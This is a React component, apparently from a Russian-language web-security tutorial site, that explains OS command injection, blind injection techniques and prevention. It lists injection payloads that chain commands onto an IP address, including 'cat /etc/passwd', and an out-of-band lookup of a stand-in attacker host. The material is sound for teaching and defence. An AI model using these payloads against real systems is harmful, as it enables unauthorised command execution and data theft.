
import Link from 'next/link';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Accordion, AccordionContent, AccordionItem, AccordionTrigger } from "@/components/ui/accordion";

const LinkStyle = "text-primary hover:text-primary/80 hover:underline";

const osCommandInjectionAccordionItems = [
  {
    id: "blind-cmd-injection",
    title: "Слепое Внедрение Команд (Blind Command Injection)",
    content: (
      <>
        <p className="text-muted-foreground mb-2">Вывод команды не отображается. Техники эксплуатации:</p>
        <ul className="list-disc list-inside space-y-1 text-sm text-muted-foreground">
          <li><strong>Временные Задержки:</strong> <code>sleep 10</code>.</li>
          <li><strong>Перенаправление Вывода:</strong> <code>cmd &gt; /var/www/html/output.txt</code>.</li>
          <li><strong>Out-of-Band (OOB) Взаимодействие:</strong> <code>nslookup attacker.com</code>, <code>curl</code>, <code>wget</code>. <Link href="https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection" target="_blank" rel="noopener noreferrer" className={LinkStyle}>Лаборатории PortSwigger (Blind OS Cmd Inj)</Link>.</li>
        </ul>
      </>
    )
  }
];

export function OsCommandInjectionSection() {
  return (
    <section id="os-command-injection" className="py-16 md:py-24">
      <div className="container mx-auto px-4 sm:px-6 lg:px-8">
        <div className="text-center mb-12">
          <h2 className="text-3xl font-bold tracking-tight text-foreground">B. Внедрение Команд ОС (OS Command Injection)</h2>
          <p className="mt-2 max-w-3xl mx-auto text-lg text-muted-foreground">Эта уязвимость позволяет выполнять произвольные команды ОС на сервере через веб-приложение.</p>
        </div>
        <div className="max-w-3xl mx-auto space-y-6">
          <Card className="shadow-lg">
            <CardHeader>
              <CardTitle className="font-semibold text-primary text-xl">Механизм Атаки</CardTitle>
            </CardHeader>
            <CardContent>
              <p className="text-sm text-muted-foreground">Возникает, когда приложение передает непроверенные пользовательские данные в системную команду. Атакующий использует метасимволы командной оболочки (;, |, &&, `).</p>
            </CardContent>
          </Card>
          <Card className="shadow-lg">
            <CardHeader>
              <CardTitle className="font-semibold text-primary text-xl">Примеры Пейлоадов</CardTitle>
            </CardHeader>
            <CardContent>
              <ul className="list-disc list-inside space-y-1 text-sm text-muted-foreground">
                <li><code>127.0.0.1; ls -la</code></li>
                <li><code>127.0.0.1 | cat /etc/passwd</code></li>
                <li><code>127.0.0.1 && id</code></li>
              </ul>
            </CardContent>
          </Card>

          <Accordion type="single" collapsible className="w-full">
            {osCommandInjectionAccordionItems.map((item) => (
              <AccordionItem value={item.id} key={item.id} className="border-b-0">
                <AccordionTrigger className="bg-primary hover:bg-primary/90 text-primary-foreground p-4 rounded-lg font-semibold flex justify-between items-center hover:no-underline">
                  {item.title}
                </AccordionTrigger>
                <AccordionContent className="bg-card p-4 rounded-b-lg border border-t-0 border-border mt-[-0.5rem] pt-6">
                  {item.content}
                </AccordionContent>
              </AccordionItem>
            ))}
          </Accordion>
          
          <Card className="shadow-lg">
            <CardHeader>
                <CardTitle className="font-semibold text-primary text-xl">Предотвращение</CardTitle>
            </CardHeader>
            <CardContent>
                <p className="text-sm text-muted-foreground">Избегать вызова системных команд с пользовательским вводом. Использовать встроенные функции языка. Строгая валидация по "белому списку", экранирование. Запуск с минимальными привилегиями. <Link href="https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html" target="_blank" rel="noopener noreferrer" className={LinkStyle}>OWASP Cmd Inj Prevention</Link>.</p>
            </CardContent>
          </Card>
        </div>
      </div>
    </section>
  );
}
